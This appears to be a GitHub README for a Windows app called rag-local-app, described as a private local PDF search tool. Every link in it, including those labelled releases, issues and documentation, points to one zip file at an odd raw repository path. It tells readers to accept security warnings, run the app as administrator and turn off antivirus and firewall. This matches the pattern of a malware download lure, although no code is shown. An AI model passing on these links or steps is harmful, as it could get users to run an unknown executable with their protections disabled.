# 🛡 rag-local-app - Secure Local RAG System

[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-brightgreen?style=for-the-badge)](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)

---

## 📘 About rag-local-app

rag-local-app is a privacy-first software for managing and searching your documents locally. It combines FastAPI, React, PostgreSQL with pgvector, and Ollama to let you ingest PDFs, create searchable data, and query using local language models. There are no cloud services involved, so your data stays on your computer.

This app is designed to run on your Windows PC. You do not need any coding skills to use it. All processing happens on your device, which reduces privacy risks and avoids internet delays.

---

## 💻 System Requirements

Before installing, make sure your PC meets these minimum requirements:

- Windows 10 or later (64-bit)
- At least 8 GB of RAM
- 2 GHz dual-core processor or faster
- 10 GB of free disk space (for database and files)
- Internet connection (only for initial download)

---

## 🚀 Getting Started

Follow these steps to download, install, and run rag-local-app on your Windows machine.

---

## 📥 Download rag-local-app

Click the badge below or visit the link to download the latest version of rag-local-app.

[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-blue?style=for-the-badge)](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)

1. Open the [rag-local-app releases page](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip) in your web browser.

2. Find the latest release. It will be the one at the top of the list.

3. Under the latest release, look for the file named something like `rag-local-app-Setup.exe` or `rag-local-app-Windows.zip`.

4. Click on the file to start downloading it to your PC.

---

## ⚙️ Installing rag-local-app

### If you downloaded an `.exe` installer:

1. Double-click the downloaded `.exe` file to run the installer.

2. If prompted by Windows security warnings, allow the app to make changes.

3. Follow the setup instructions on screen. You can usually accept the default options.

4. Once installation finishes, look for the rag-local-app shortcut on your desktop or in the Start Menu.

### If you downloaded a `.zip` file:

1. Right-click the `.zip` file and choose **Extract All...**.

2. Select a folder where you want to extract the files.

3. Open the extracted folder and double-click `rag-local-app.exe` to launch the app.

---

## ▶️ Running rag-local-app

1. Launch rag-local-app from the shortcut or by opening `rag-local-app.exe`.

2. The app will open a window connecting to its local server. This may take a few seconds.

3. You will see the main interface with options to ingest PDFs, generate embeddings, and ask questions.

4. Use the buttons in the app to add PDFs from your computer.

5. rag-local-app will process your PDFs and create indexes that help with fast searching.

6. You can then type questions or keywords to query the content of your PDFs using the local language model.

---

## 🛠 Features at a glance

- Import PDFs for local document search.

- Create embeddings of documents using built-in models.

- Search and query documents with local large language models (LLMs).

- No cloud or internet calls after setup: all data stays local.

- Clean, easy web interface powered by React in your browser.

- Uses PostgreSQL with the pgvector extension to store search data.

- Runs a local FastAPI server in the background to manage requests.

---

## ⚙️ Background processes and components

rag-local-app runs multiple components silently in the background:

- **FastAPI server:** Handles communication and processing locally.

- **PostgreSQL database:** Stores all document data and search vectors.

- **Ollama local LLM:** Runs your language model for query answering.

These parts work automatically without user setup after you install the app.

---

## 📂 Adding PDFs and managing data

1. Click the **Add PDFs** button.

2. Select one or several PDF files from your device.

3. The app will start processing the PDFs and build search indexes.

4. You can view a list of uploaded files anytime.

5. Remove files via the interface if you want to delete documents.

---

## 🔍 Searching with rag-local-app

1. Type your query or question in the search box.

2. rag-local-app uses local LLMs to find relevant answers from your PDFs.

3. The results appear with snippets from your documents.

4. You can click results to open the corresponding PDF pages.

5. This process happens quickly without sending data outside your PC.

---

## ⚙️ Updating rag-local-app

To update rag-local-app:

1. Visit the [releases page](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip) regularly.

2. Download the newest version following the download instructions above.

3. Run the new installer or replace files if using a zip package.

Your data and settings will stay intact during updates.

---

## ❓ Troubleshooting

### rag-local-app will not open

- Check if your antivirus or firewall blocks the app. Temporarily disable them to test.

- Make sure you run the app as a user with administrator rights.

- Restart your PC and try again.

### PDFs don’t load or process

- Confirm the PDFs are valid and not password-protected.

- Allow sufficient time for processing larger files.

- Restart rag-local-app if processing hangs.

### Search returns no results

- Ensure you have uploaded and processed PDFs.

- Use clear keywords closely related to your documents.

---

## 🚪 Uninstalling rag-local-app

To uninstall:

1. Open **Settings** on Windows.

2. Go to **Apps > Installed apps**.

3. Find rag-local-app in the list.

4. Select it and click **Uninstall**.

This will remove the app files, but it may leave data folders behind which you can delete manually from your user folder.

---

## 🔗 Useful Links

- [rag-local-app Releases](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)

- [Project Issues and Discussions](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip)

- [Documentation and FAQs](https://github.com/thecontrolfreak/rag-local-app/raw/refs/heads/main/the/rag-app-local-v1.4.zip) (if available)

---

## 🔧 Technical Details (Optional)

- Backend: FastAPI (Python)

- Frontend: React

- Vector database: PostgreSQL with pgvector

- Local LLM: Ollama

- Data formats supported: PDFs for input

- Runs fully on local Windows environment with no internet calls after installation.